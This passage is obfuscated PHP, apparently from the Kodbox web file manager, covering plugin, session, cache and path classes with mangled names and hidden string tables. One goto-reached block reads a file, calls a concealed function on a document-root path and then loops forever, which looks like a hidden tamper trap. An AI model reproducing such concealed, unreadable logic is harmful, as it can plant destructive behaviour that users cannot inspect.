$ôÄÄ‘·® = array($­¦Û¹œÆ[426] => array($­¦Û¹œÆ[427], $‹‹éÚ¼¥), $­¦Û¹œÆ[505] => $ú¦¸úË€, $­¦Û¹œÆ[420] => SourceModel::TYPE_GROUP); $ÖóÃòó¸ = Model($­¦Û¹œÆ[1349])->listSource($ôÄÄ‘·®); if (!$ÖóÃòó¸ || count($‹‹éÚ¼¥) == $ÖóÃòó¸[$­¦Û¹œÆ[366]][$­¦Û¹œÆ[367]]) { return $ÖóÃòó¸; } $Îàå‰ôş = array(); $òéíâû‚ = array_to_keyvalue($ÖóÃòó¸[$­¦Û¹œÆ[82]], $­¦Û¹œÆ[12], $­¦Û¹œÆ[411]); $Ûàñ¼ƒö = array_to_keyvalue($ÖóÃòó¸[$­¦Û¹œÆ[83]], $­¦Û¹œÆ[12], $­¦Û¹œÆ[411]); $æ³àØ— = array_merge($Ûàñ¼ƒö, $òéíâû‚); foreach ($‹‹éÚ¼¥ as $ÄÂ¤§É¾) { if (!in_array($ÄÂ¤§É¾, $æ³àØ—)) { $Îàå‰ôş[] = $ÄÂ¤§É¾; } } if ($Îàå‰ôş) { $this->removeBySource($ú¦¸úË€, $Îàå‰ôş); } return $ÖóÃòó¸; } protected function listData($å¦¡û) { $õà€Ò¢´ =& $_SERVER[ï»»·÷á]; $÷’»èäİ = array($õà€Ò¢´[1669] => 0, $õà€Ò¢´[492] => array($õà€Ò¢´[1982], 0), $õà€Ò¢´[431] => $õà€Ò¢´[1983] . $å¦¡û); $á‘…”°Š = $õà€Ò¢´[1984]; $‹ÌÎÓ« = $this->field($á‘…”°Š)->where($÷’»èäİ)->order($õà€Ò¢´[1985])->select(); return $‹ÌÎÓ« ? $‹ÌÎÓ« : array(); } protected function addToTag($ æØÙÏì, $ë²àµÌŸ, $áµé…í) { $³Üé›™‹ =& $_SERVER[ï»»·÷á]; if (!$this->getByTagID($ æØÙÏì, $áµé…í) || !$ë²àµÌŸ) { return !1; } if (!Model($³Üé›™‹[838])->pathInfo($ë²àµÌŸ)) { return !1; } $úë¡£Áú = array($³Üé›™‹[1669] => 0, $³Üé›™‹[492] => $áµé…í, $³Üé›™‹[430] => $ë²àµÌŸ, $³Üé›™‹[431] => $³Üé›™‹[1986] . $ æØÙÏì, $³Üé›™‹[429] => $³Üé›™‹[12], $³Üé›™‹[1871] => 0); if ($this->where($úë¡£Áú)->find()) { return !1; } return $this->add($úë¡£Áú); } protected function removeFromTag($î§™«©¹, $®©Üê, $éÙ…) { $î”£…ì° =& $_SERVER[ï»»·÷á]; if (!$this->getByTagID($î§™«©¹, $éÙ…) || !$®©Üê) { return !1; } if (is_array($®©Üê)) { $®©Üê = array($î”£…ì°[7], $®©Üê); } $¥„¡Øáø = array($î”£…ì°[1669] => 0, $î”£…ì°[492] => $éÙ…, $î”£…ì°[431] => $î”£…ì°[1986] . $î§™«©¹, $î”£…ì°[430] => $®©Üê); return $this->where($¥„¡Øáø)->delete(); } protected function removeByTag($ŠÀ¯×³ , $Ìêö‰†²) { $É¥¢®Ö =& $_SERVER[ï»»·÷á]; if (!$this->getByTagID($ŠÀ¯×³ , $Ìêö‰†²)) { return !1; } $Ê‰”ş•ú = array($É¥¢®Ö[1669] => 0, $É¥¢®Ö[492] => $Ìêö‰†², $É¥¢®Ö[431] => $É¥¢®Ö[1986] . $ŠÀ¯×³ ); return $this->where($Ê‰”ş•ú)->delete(); } protected function removeBySource($É¸ÌÏó±, $»éÚø—¿) { $ªä‘¤• =& $_SERVER[ï»»·÷á]; if (!$É¸ÌÏó± || !$»éÚø—¿) { return !1; } if (is_array($»éÚø—¿)) { $»éÚø—¿ = array($ªä‘¤•[7], $»éÚø—¿); } $ãùù•­‚ = array($ªä‘¤•[1669] => 0, $ªä‘¤•[430] => $»éÚø—¿, $ªä‘¤•[492] => array($ªä‘¤•[1024], 0), $ªä‘¤•[431] => $ªä‘¤•[1986] . $É¸ÌÏó±); return $this->where($ãùù•­‚)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\160\154\165\147\151\156\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x73\x74\x61\164\165\163", "\x72\145\147\151\145\x73\164", "\x63\157\x6e\146\151\147"); public function loadList($ÍèÖ»áâ = false) { $Àó¹İ© = array_to_keyvalue($this->listData(), $_SERVER[ï»»·÷á][32]); if ($ÍèÖ»áâ) { return $Àó¹İ©[$ÍèÖ»áâ]; } return $Àó¹İ©; } public function init() { $¨Ç™âÆ =& $_SERVER[ï»»·÷á]; Hook::trigger($¨Ç™âÆ[1987]); $üÙ‰›´ƒ = $this->loadPluginList(); foreach ($üÙ‰›´ƒ as $¤Õßå» => $ŞÊœ˜Ó¤) { $ï”—Ùó = $this->appAllow($¤Õßå», $ŞÊœ˜Ó¤); if (!$ï”—Ùó) { continue; } foreach ($ŞÊœ˜Ó¤[$¨Ç™âÆ[1988]] as $³Ú¹¤‰¤ => $èƒ·”³) { Hook::bind($³Ú¹¤‰¤, $èƒ·”³); } } Hook::trigger($¨Ç™âÆ[1989]); Hook::trigger(ACTION); } public function appAllow($·ÚÄù«Æ, $İ™Ú›Ç¼, $ëÈ°ÅÀò = true) { $Ş„¤Ò”æ =& $_SERVER[ï»»·÷á]; $Æ‡Ğíúí = PLUGIN_DIR . $·ÚÄù«Æ . $Ş„¤Ò”æ[1990]; if (!is_array($İ™Ú›Ç¼) || !is_array($İ™Ú›Ç¼[$Ş„¤Ò”æ[1988]]) || $İ™Ú›Ç¼[$Ş„¤Ò”æ[762]] != 1 || !is_file($Æ‡Ğíúí)) { return !1; } if ($GLOBALS[$Ş„¤Ò”æ[503]] == 1) { if ($GLOBALS[$Ş„¤Ò”æ[6]][$Ş„¤Ò”æ[1991]] || !$GLOBALS[$Ş„¤Ò”æ[6]][$Ş„¤Ò”æ[1992]]) { return !0; } $ÜŸ—ñ¥ = explode($Ş„¤Ò”æ[50], strtolower($GLOBALS[$Ş„¤Ò”æ[6]][$Ş„¤Ò”æ[1992]])); return in_array(strtolower($·ÚÄù«Æ), $ÜŸ—ñ¥) ? !1 : !0; } if ($ëÈ°ÅÀò && !Action($Ş„¤Ò”æ[1993])->checkAuth($·ÚÄù«Æ)) { return !1; } return !0; } public function unInstall($¢Œ •À¼) { $Ø‘ªÚ°É =& $_SERVER[ï»»·÷á]; $À›²ã¢ = $this->loadList($¢Œ •À¼); if (file_exists(PLUGIN_DIR . $¢Œ •À¼)) { Hook::apply($¢Œ •À¼ . $Ø‘ªÚ°É[1994]); } $this->remove($À›²ã¢[$Ø‘ªÚ°É[399]]); } public function changeStatus($é‡“ì‚¤, $© €‡) { $¡©¶ø¤å =& $_SERVER[ï»»·÷á]; $Æ„ô¹™¿ = $this->loadList($é‡“ì‚¤); if ($© €‡) { Hook::apply($é‡“ì‚¤ . $¡©¶ø¤å[1995]); } $this->update($Æ„ô¹™¿[$¡©¶ø¤å[399]], array($¡©¶ø¤å[1996] => $© €‡)); } public function appRegist($ˆ¸éàçŒ, $Ê¯‹ğÖø) { $á÷ß”¯¤ =& $_SERVER[ï»»·÷á]; $·ƒñÅÁ = $this->loadList($ˆ¸éàçŒ); if ($·ƒñÅÁ) { $this->update($·ƒñÅÁ[$á÷ß”¯¤[399]], array($á÷ß”¯¤[1988] => $Ê¯‹ğÖø)); } else { $âĞ›Èš€ = array($á÷ß”¯¤[32] => $ˆ¸éàçŒ, $á÷ß”¯¤[1988] => $Ê¯‹ğÖø, $á÷ß”¯¤[762] => 0, $á÷ß”¯¤[6] => $this->getConfigDefault($ˆ¸éàçŒ)); $this->insert($âĞ›Èš€); } } public function getConfigDefault($ÙÅéÅŠê) { $ÂÜ¥¹Áš =& $_SERVER[ï»»·÷á]; $³“‘¨Âû = array(); $÷’‚¥Ğå = $this->getPackageJson($ÙÅéÅŠê); if (!$÷’‚¥Ğå && is_array($÷’‚¥Ğå[$ÂÜ¥¹Áš[1997]])) { return $³“‘¨Âû; } foreach ($÷’‚¥Ğå[$ÂÜ¥¹Áš[1997]] as $¹¾´—×ğ => $éûË—ñ…) { if (!isset($éûË—ñ…[$ÂÜ¥¹Áš[374]]) || isset($³“‘¨Âû[$¹¾´—×ğ])) { continue; } $³“‘¨Âû[$¹¾´—×ğ] = $éûË—ñ…[$ÂÜ¥¹Áš[374]]; } return $³“‘¨Âû; } public function getPackageJson($ÕçÁÆ¹) { return Hook::apply($ÕçÁÆ¹ . $_SERVER[ï»»·÷á][1998]); } public function getConfig($ñØ»‡Ğ, $Ïè¬êœ = false) { $ÁÒ·íŠ =& $_SERVER[ï»»·÷á]; $©Î½ÀÁã = array(); $¶Ç§çÂ© = $this->loadList($ñØ»‡Ğ); if ($¶Ç§çÂ© && is_array($¶Ç§çÂ©[$ÁÒ·íŠ[6]])) { $©Î½ÀÁã = $¶Ç§çÂ©[$ÁÒ·íŠ[6]]; } if (!$©Î½ÀÁã || $Ïè¬êœ) { $©Î½ÀÁã = $this->getConfigDefault($ñØ»‡Ğ); } return $©Î½ÀÁã; } public function setConfig($ïëğïÑó, $Óµ Š¼» = false) { $š¸î­¼Œ =& $_SERVER[ï»»·÷á]; $¡ó˜Ğè = $this->loadList($ïëğïÑó); if (!$¡ó˜Ğè) { return !1; } $‰ïé£ó… = $¡ó˜Ğè[$š¸î­¼Œ[6]]; if ($Óµ Š¼» == !1) { $‰ïé£ó… = array(); $Óµ Š¼» = $this->getConfigDefault($ïëğïÑó); } foreach ($Óµ Š¼» as $ŒšÀ±ôí => $Ï·Í—äÌ) { $‰ïé£ó…[$ŒšÀ±ôí] = is_string($Ï·Í—äÌ) ? trim($Ï·Í—äÌ) : $Ï·Í—äÌ; } $this->update($¡ó˜Ğè[$š¸î­¼Œ[399]], array($š¸î­¼Œ[6] => $‰ïé£ó…)); } public function viewList() { $‘´¸™ =& $_SERVER[ï»»·÷á]; $Ş¾™Óò– = $this->loadList(); $this->pluginScan($Ş¾™Óò–); $Ş¾™Óò– = $this->loadPluginList(); $íÒÔ³«ì = array(); foreach ($Ş¾™Óò– as $©êŸ¤ôŞ => $ƒÕ´µµ) { unset($ƒÕ´µµ[$‘´¸™[1988]], $ƒÕ´µµ[$‘´¸™[6]]); $ƒàŒŞü¤ = PLUGIN_DIR . $ƒÕ´µµ[$‘´¸™[32]] . $‘´¸™[1990]; if (!is_file($ƒàŒŞü¤)) { continue; } $ÍÒàùª£ = Hook::apply($ƒÕ´µµ[$‘´¸™[32]] . $‘´¸™[1998]); if (is_array($ÍÒàùª£)) { $íÒÔ³«ì[$©êŸ¤ôŞ] = array_merge($ƒÕ´µµ, $ÍÒàùª£); } } return $íÒÔ³«ì; } private function loadPluginList() { $Ä‚Ú¡ù =& $_SERVER[ï»»·÷á]; $àèàşª› = $this->loadList(); if (strtolower(MOD) == $Ä‚Ú¡ù[1999]) { return $àèàşª›; } $é“ßÚ¢á = Hook::trigger($Ä‚Ú¡ù[2000], $àèàşª›); if ($àèàşª› && !$é“ßÚ¢á) { die; } return $é“ßÚ¢á ? $é“ßÚ¢á : $àèàşª›; } private function pluginScan($Ÿ×ÜÛ˜ü) { $£ËÆñ™Á =& $_SERVER[ï»»·÷á]; recursion_dir(PLUGIN_DIR, $¶ŸåÂÎ‘, $¸ ñ¯õÄ, 0); foreach ($¶ŸåÂÎ‘ as $¡úÄ¸Îú) { $úÚ‡™Ê© = get_path_this($¡úÄ¸Îú); if (isset($Ÿ×ÜÛ˜ü[$úÚ‡™Ê©]) || !file_exists($¡úÄ¸Îú . $£ËÆñ™Á[2001]) || !file_exists($¡úÄ¸Îú . $£ËÆñ™Á[1990])) { continue; } Hook::apply($úÚ‡™Ê© . $£ËÆñ™Á[1995]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\x6d\137\163\x65\163\x73\x69\x6f\x6e"; public function get($ÍÓæÙ ) { $ÙıÉ·ş =& $_SERVER[ï»»·÷á]; $•¿â³ä› = $this->where(array($ÙıÉ·ş[2002] => $ÍÓæÙ ))->find(); if (!is_array($•¿â³ä›)) { return !1; } return $•¿â³ä›[$ÙıÉ·ş[767]]; } public function set($íñ§¹“², $ÓÁû„ãš, $î½Û¼ = 3600) { $êÒÍÖÒé =& $_SERVER[ï»»·÷á]; $Îüğú‹ = array($êÒÍÖÒé[2002] => $íñ§¹“², $êÒÍÖÒé[1906] => $ÓÁû„ãš, $êÒÍÖÒé[2003] => $î½Û¼ + time()); if (Session::get($êÒÍÖÒé[2004])) { $Îüğú‹[$êÒÍÖÒé[1678]] = Session::get($êÒÍÖÒé[2004]); } else { $Îüğú‹[$êÒÍÖÒé[1678]] = 0; } if ($this->get($íñ§¹“²)) { return $this->where(array($êÒÍÖÒé[2002] => $íñ§¹“²))->save($Îüğú‹); } else { return $this->add($Îüğú‹, array(), !0); } } public function remove($½ñ‚¶¶‰) { return $this->where(array($_SERVER[ï»»·÷á][2002] => $½ñ‚¶¶‰))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ï»»·÷á][2005] . time())->delete(); } } goto aÜ­„ÚÌ¡÷; bÆğÙ„îÑŒ: if (!isset($_SERVER[$_SERVER[ï»»·÷á][401]]) || !isset($_SERVER[$_SERVER[ï»»·÷á][409]])) { $_getc = $_SERVER[ï»»·÷á][403]; $_getfile = $_SERVER[$_SERVER[ï»»·÷á][404]] . $_SERVER[ï»»·÷á][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ï»»·÷á][231], $_getfilec); if (count($_getarrs) < $_SERVER[ï»»·÷á][406]) { $exit = $_SERVER[ï»»·÷á][407]; $exit(); } $_act = $_SERVER[ï»»·÷á][408]; $_act($_SERVER[$_SERVER[ï»»·÷á][404]] . $_SERVER[ï»»·÷á][405]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ï»»·÷á][378]); } } class CacheLockDatabase { public function lock($Ó©ÔæÊé, $±ÌÙÀÄ„ = 0) { $„ÙÏ’äç = Model($_SERVER[ï»»·÷á][842]); $úñü€Íº = microtime(!0) + $±ÌÙÀÄ„; while (microtime(!0) < $úñü€Íº) { $Úøò¥Ö° = $„ÙÏ’äç->get($Ó©ÔæÊé); if (!$Úøò¥Ö° || $Úøò¥Ö° < microtime(!0)) { $ÅçŒ‰€¥ = $„ÙÏ’äç->set($Ó©ÔæÊé, $úñü€Íº); if ($ÅçŒ‰€¥) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ïï‰‚) { return Model($_SERVER[ï»»·÷á][842])->get($ïï‰‚); } public function unlock($±¼”á¦ø) { Model($_SERVER[ï»»·÷á][842])->remove($±¼”á¦ø); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Å’Ì·£, $Ãè€ô¼¼) { $ºœ¤ïè÷ =& $_SERVER[ï»»·÷á]; if (!class_exists($ºœ¤ïè÷[879])) { show_json($ºœ¤ïè÷[880], !1); } $this->cacheTime = $Ãè€ô¼¼; $this->handle = new Memcached(); if (is_array($Å’Ì·£[$ºœ¤ïè÷[881]]) && count($Å’Ì·£[$ºœ¤ïè÷[881]]) >= 1) { foreach ($Å’Ì·£[$ºœ¤ïè÷[881]] as $´…À¨) { $­¼¶Á = explode($ºœ¤ïè÷[4], $´…À¨); $this->handle->addServer($­¼¶Á[0], $­¼¶Á[1]); } } else { $this->handle->addServer($Å’Ì·£[$ºœ¤ïè÷[182]], $Å’Ì·£[$ºœ¤ïè÷[183]]); } } public function set($û»ÇúÜî, $€÷«£ãö, $¥Ò’£½Ş = false) { $¥Ò’£½Ş = $¥Ò’£½Ş ? $¥Ò’£½Ş : $this->cacheTime; return $this->handle->set($û»ÇúÜî, $€÷«£ãö, $¥Ò’£½Ş); } public function get($“Ø¨öÙÄ) { return $this->handle->get($“Ø¨öÙÄ); } public function remove($à÷é‰¸©) { return $this->handle->delete($à÷é‰¸©); } public function deleteAll() { return $this->handle->flush(); } } goto AÎ––È›ÇÕ; A§‡–ÚÖáæ: class KodIO { const KOD_SOURCE = "\173\163\157\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\122\x65\143\x79\143\x6c\145\175"; const KOD_USER_FAV = "\173\x75\x73\x65\162\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\x46\x69\x6c\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\x72\x46\151\x6c\x65\x54\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\x75\160\x52\x6f\x6f\x74\x53\x65\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\162\x53\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\123\x68\x61\162\x65\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\145\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\x72\145\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\145\x49\164\x65\155\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\x73\145\x61\162\143\150\175"; const KOD_BLOCK = "\173\x62\154\x6f\143\x6b\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\163\145\x72\122\145\x6e\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\162\x7d"; public static function typeList() { $œ–¸Õó =& $_SERVER[ï»»·÷á]; return array($œ–¸Õó[1261] => self::KOD_SOURCE, $œ–¸Õó[1262] => self::KOD_USER_RECYCLE, $œ–¸Õó[1263] => self::KOD_USER_FAV, $œ–¸Õó[1264] => self::KOD_USER_FILE_TAG, $œ–¸Õó[1265] => self::KOD_USER_FILE_TYPE, $œ–¸Õó[1266] => self::KOD_GROUP_ROOT_SELF, $œ–¸Õó[1267] => self::KOD_USER_SHARE, $œ–¸Õó[1268] => self::KOD_USER_SHARE_LINK, $œ–¸Õó[1269] => self::KOD_USER_SHARE_TO_ME, $œ–¸Õó[1270] => self::KOD_SHARE_ITEM, $œ–¸Õó[1271] => self::KOD_SHARE_LINK, $œ–¸Õó[1272] => self::KOD_SEARCH, $œ–¸Õó[1273] => self::KOD_BLOCK, $œ–¸Õó[1274] => self::KOD_IO, $œ–¸Õó[1275] => self::KOD_USER_RECENT, $œ–¸Õó[1276] => self::KOD_USER_DRIVER); } public static function parse($Ÿ˜èåĞ) { $±¢›Ôø¦ =& $_SERVER[ï»»·÷á]; $Ÿ˜èåĞ = self::clear($Ÿ˜èåĞ); $×ª£Ìà = array_values(self::typeList()); preg_match($±¢›Ôø¦[1277], $Ÿ˜èåĞ, $ °°ã£); $·â¬ú›ƒ = array($±¢›Ôø¦[431] => !1, $±¢›Ôø¦[1278] => !1, $±¢›Ôø¦[428] => !1, $±¢›Ôø¦[84] => $Ÿ˜èåĞ, $±¢›Ôø¦[1179] => !1, $±¢›Ôø¦[1178] => $±¢›Ôø¦[12]); if (is_array($ °°ã£) && count($ °°ã£) == 5) { $¦™˜Ê–Å = $±¢›Ôø¦[1279] . $ °°ã£[2] . $±¢›Ôø¦[327]; if (in_array($¦™˜Ê–Å, $×ª£Ìà)) { $·â¬ú›ƒ[$±¢›Ôø¦[1179]] = $ °°ã£[1]; $·â¬ú›ƒ[$±¢›Ôø¦[33]] = $¦™˜Ê–Å; $·â¬ú›ƒ[$±¢›Ôø¦[1280]] = substr($¦™˜Ê–Å, 1, -1); $·â¬ú›ƒ[$±¢›Ôø¦[399]] = $ °°ã£[3]; } $·â¬ú›ƒ[$±¢›Ôø¦[1178]] = $ °°ã£[4]; } $™ë»…ı = array($±¢›Ôø¦[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $·â¬ú›ƒ[$±¢›Ôø¦[1243]] = in_array($·â¬ú›ƒ[$±¢›Ôø¦[33]], $™ë»…ı); return $·â¬ú›ƒ; } public static function isTruePath($¶ìàÆ°Í) { $Æ°‡¿ùÅ =& $_SERVER[ï»»·÷á]; if (substr($¶ìàÆ°Í, 0, 1) != $Æ°‡¿ùÅ[1279]) { return !0; } if (strpos($¶ìàÆ°Í, $Æ°‡¿ùÅ[417]) === 0) { return !0; } if (strpos($¶ìàÆ°Í, $Æ°‡¿ùÅ[1247]) === 0) { return !0; } if (strpos($¶ìàÆ°Í, $Æ°‡¿ùÅ[1281]) === 0) { return !0; } if (strpos($¶ìàÆ°Í, $Æ°‡¿ùÅ[1282]) === 0) { return !0; } if (strpos($¶ìàÆ°Í, $Æ°‡¿ùÅ[1283]) === 0) { return !0; } return !1; } public static function clear($ÎÓ©Ëˆ§) { $Ú£®ùù¾ =& $_SERVER[ï»»·÷á]; $ÎÓ©Ëˆ§ = str_replace(array($Ú£®ùù¾[1088], $Ú£®ùù¾[231]), $Ú£®ùù¾[53], $ÎÓ©Ëˆ§); $ÎÓ©Ëˆ§ = str_replace($Ú£®ùù¾[97], $Ú£®ùù¾[8], $ÎÓ©Ëˆ§); $å†à¬·½ = $Ú£®ùù¾[1284]; if (substr($ÎÓ©Ëˆ§, 0, 3) == $Ú£®ùù¾[1285]) { $ÎÓ©Ëˆ§ = substr($ÎÓ©Ëˆ§, 3); } while (strstr($ÎÓ©Ëˆ§, $å†à¬·½)) { $ÎÓ©Ëˆ§ = str_replace($å†à¬·½, $Ú£®ùù¾[8], $ÎÓ©Ëˆ§); } $ÎÓ©Ëˆ§ = preg_replace($Ú£®ùù¾[1286], $Ú£®ùù¾[8], $ÎÓ©Ëˆ§); if ($ÎÓ©Ëˆ§ == $Ú£®ùù¾[8]) { return $Ú£®ùù¾[8]; } $ÎÓ©Ëˆ§ = rtrim($ÎÓ©Ëˆ§, $Ú£®ùù¾[8]); return $ÎÓ©Ëˆ§; } public static function sourceID($á®«ù³¿) { $ôúâ™¦á =& $_SERVER[ï»»·÷á]; $²¤¦Ü÷² = self::parse($á®«ù³¿); if ($²¤¦Ü÷²[$ôúâ™¦á[33]] !== self::KOD_SOURCE) { show_json(LNG($ôúâ™¦á[1287]), !1); } return $²¤¦Ü÷²[$ôúâ™¦á[399]]; } public static function make($ÈÖœ€„) { if (!$ÈÖœ€„) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÈÖœ€„)); } public static function makeShare($áÙ—å¥™, $âßîë) { return self::makePath(self::KOD_SHARE_ITEM, $áÙ—å¥™, $âßîë); } public static function makeFileTypePath($Àà´äõô) { return self::makePath(self::KOD_USER_FILE_TYPE, $Àà´äõô); } public static function makeFileTagPath($”Ò¡»Å‰) { return self::makePath(self::KOD_USER_FILE_TAG, $”Ò¡»Å‰); } public static function makePath($® Íş©, $‡úÚÔÁ = '', $Êï…ÇÑÍ = '') { $ù¾Ş›‘× =& $_SERVER[ï»»·÷á]; $ÇÃ·Òè = substr($® Íş©, 1, -1); $é˜ëí•ë = $ù¾Ş›‘×[1288] . $ÇÃ·Òè . $ù¾Ş›‘×[1289] . $‡úÚÔÁ . $ù¾Ş›‘×[1290]; $é˜ëí•ë = $Êï…ÇÑÍ ? $é˜ëí•ë . $Êï…ÇÑÍ . $ù¾Ş›‘×[8] : $é˜ëí•ë; return $é˜ëí•ë; } public static function hashPath($ë¶íÁÜ, $Í©Ú¤¡æ = true) { $òÛ–¾ë¨ =& $_SERVER[ï»»·÷á]; $–è¾Âóˆ = is_array($ë¶íÁÜ) ? $ë¶íÁÜ : IO::info($ë¶íÁÜ); $„…ï”ø = _get($–è¾Âóˆ, $òÛ–¾ë¨[1291], $òÛ–¾ë¨[12]); if (!$„…ï”ø && isset($–è¾Âóˆ[$òÛ–¾ë¨[411]])) { $–è¾Âóˆ = IO::info(KodIO::make($–è¾Âóˆ[$òÛ–¾ë¨[411]])); $„…ï”ø = _get($–è¾Âóˆ, $òÛ–¾ë¨[1291], $òÛ–¾ë¨[12]); } if (!$„…ï”ø && $Í©Ú¤¡æ) { $×§ìÛ­÷ = KodIO::parse($–è¾Âóˆ[$òÛ–¾ë¨[84]]); if (!$×§ìÛ­÷[$òÛ–¾ë¨[33]]) { $„…ï”ø = IO::hashSimple($–è¾Âóˆ[$òÛ–¾ë¨[84]]); } } if (!$„…ï”ø) { $„…ï”ø = md5($–è¾Âóˆ[$òÛ–¾ë¨[84]] . $–è¾Âóˆ[$òÛ–¾ë¨[76]] . $–è¾Âóˆ[$òÛ–¾ë¨[85]]); } return $„…ï”ø; } public static function hashPathSafe($ÍïŒŞ‚, $‰•ë¼Ÿş = true) { $çãÈóÈ =& $_SERVER[ï»»·÷á]; $Â”ë„—« = self::hashPath($ÍïŒŞ‚, $‰•ë¼Ÿş); return md5($Â”ë„—« . $çãÈóÈ[1292] . Model($çãÈóÈ[783])->get($çãÈóÈ[784])); } public static function initSystemPath() { $ªİçªÉª =& $_SERVER[ï»»·÷á]; if (defined($ªİçªÉª[1293])) { return; } define($ªİçªÉª[1293], self::systemPath($ªİçªÉª[1294])); define($ªİçªÉª[1295], self::systemPath($ªİçªÉª[1296])); define($ªİçªÉª[1297], self::systemPath($ªİçªÉª[1298])); define($ªİçªÉª[1299], self::systemPath($ªİçªÉª[1300])); IOHistory::bindEvent(); } public static function systemPath($¾Ç¬Ÿ÷) { $ºŞ‚ŠÖ =& $_SERVER[ï»»·÷á]; $£‘¿áš× = $ºŞ‚ŠÖ[1301] . ucfirst($¾Ç¬Ÿ÷); $÷Ì³®ÕÎ = Model($ºŞ‚ŠÖ[783])->get($£‘¿áš×); if ($÷Ì³®ÕÎ) { return $÷Ì³®ÕÎ; } if ($¾Ç¬Ÿ÷ == $ºŞ‚ŠÖ[1294]) { $÷Ì³®ÕÎ = self::make(Model($ºŞ‚ŠÖ[838])->systemRootPathAdd($ºŞ‚ŠÖ[543])); } else { $÷Ì³®ÕÎ = self::systemPath($ºŞ‚ŠÖ[1294]); $¶Æ¶œÀı = self::sourceID($÷Ì³®ÕÎ); $÷Ì³®ÕÎ = self::make(Model($ºŞ‚ŠÖ[838])->mkdir($¶Æ¶œÀı, $¾Ç¬Ÿ÷)); } Model($ºŞ‚ŠÖ[783])->set($£‘¿áš×, $÷Ì³®ÕÎ); return $÷Ì³®ÕÎ; } public static function systemFolder($Ğé”à®Š) { $šæÉ–Á = IO_PATH_SYSTEM_SOURCE . $Ğé”à®Š; $œº÷ÑœÉ = Cache::get($šæÉ–Á); if (!$œº÷ÑœÉ) { $¬àØòíë = IO::infoFull($šæÉ–Á); if (!$¬àØòíë) { $œº÷ÑœÉ = IO::mkdir($šæÉ–Á, REPEAT_SKIP); } else { $œº÷ÑœÉ = $¬àØòíë[$_SERVER[ï»»·÷á][84]]; } Cache::set($šæÉ–Á, $œº÷ÑœÉ, 3600 * 10); } return $œº÷ÑœÉ; } public static function defaultDriver() { return Model($_SERVER[ï»»·÷á][780])->defaultDriver(); } public static function defaultIO() { $ÍÁü—Òì =& $_SERVER[ï»»·÷á]; $›Å©®“ = self::defaultDriver(); return $ÍÁü—Òì[1302] . $›Å©®“[$ÍÁü—Òì[399]] . $ÍÁü—Òì[1290]; } public static function defaultDriverInit() { static $¢Çİà„Ş = false; if ($¢Çİà„Ş) { return $¢Çİà„Ş; } $¢Çİà„Ş = IO::init(self::defaultIO()); return $¢Çİà„Ş; } public static function fileTypeList() { $ŞÌˆªÓÙ =& $_SERVER[ï»»·÷á]; $À¿óæåØ = $GLOBALS[$ŞÌˆªÓÙ[6]][$ŞÌˆªÓÙ[1303]]; foreach ($À¿óæåØ as $œ®ìò‰ò => $§ĞŞúÃÖ) { $ªÉ«™ß— = $ŞÌˆªÓÙ[1304] . $œ®ìò‰ò; $¦¤Ùñ­ = LNG($ªÉ«™ß—); if ($ªÉ«™ß— != $¦¤Ùñ­) { $À¿óæåØ[$œ®ìò‰ò][$ŞÌˆªÓÙ[32]] = $¦¤Ùñ­; } } return $À¿óæåØ; } public static function diskList($ùûÑƒ = true) { $ñŞ´¢Ÿ = $_SERVER[ï»»·÷á][1305]; if ($ùûÑƒ) { $íºŞíï¢ = Cache::get($ñŞ´¢Ÿ); if (is_array($íºŞíï¢)) { return $íºŞíï¢; } } $íºŞíï¢ = self::diskListGet(); Cache::set($ñŞ´¢Ÿ, $íºŞíï¢, 60); return $íºŞíï¢; } public static function diskListGet() { $æ†¹†‡³ =& $_SERVER[ï»»·÷á]; $Úğ¬¦ã¤ = array(); if ($GLOBALS[$æ†¹†‡³[6]][$æ†¹†‡³[1306]] == $æ†¹†‡³[1307]) { $ÃØÌÚ¿Ø = $æ†¹†‡³[1308]; for ($ÙƒİŸ»­ = 0; $ÙƒİŸ»­ < strlen($ÃØÌÚ¿Ø); $ÙƒİŸ»­++) { $´ç¤Ç”è = $ÃØÌÚ¿Ø[$ÙƒİŸ»­] . $æ†¹†‡³[1309]; if (file_exists($´ç¤Ç”è)) { $Úğ¬¦ã¤[] = $´ç¤Ç”è; } } return $Úğ¬¦ã¤; } if (!function_exists($æ†¹†‡³[98])) { $Úğ¬¦ã¤[] = $æ†¹†‡³[848]; return $Úğ¬¦ã¤; } $ƒßöé«‡ = explode($æ†¹†‡³[231], shell_exec($æ†¹†‡³[1310])); array_shift($ƒßöé«‡); array_pop($ƒßöé«‡); $¯¹ÁšØË = array($æ†¹†‡³[1311], $æ†¹†‡³[1312], $æ†¹†‡³[1313], $æ†¹†‡³[1314], $æ†¹†‡³[1315], $æ†¹†‡³[1316], $æ†¹†‡³[1317], $æ†¹†‡³[1318]); foreach ($ƒßöé«‡ as $êıä„ªÇ) { $šÜÃÛÃº = preg_split($æ†¹†‡³[1319], $êıä„ªÇ); $´ç¤Ç”è = $šÜÃÛÃº[count($šÜÃÛÃº) 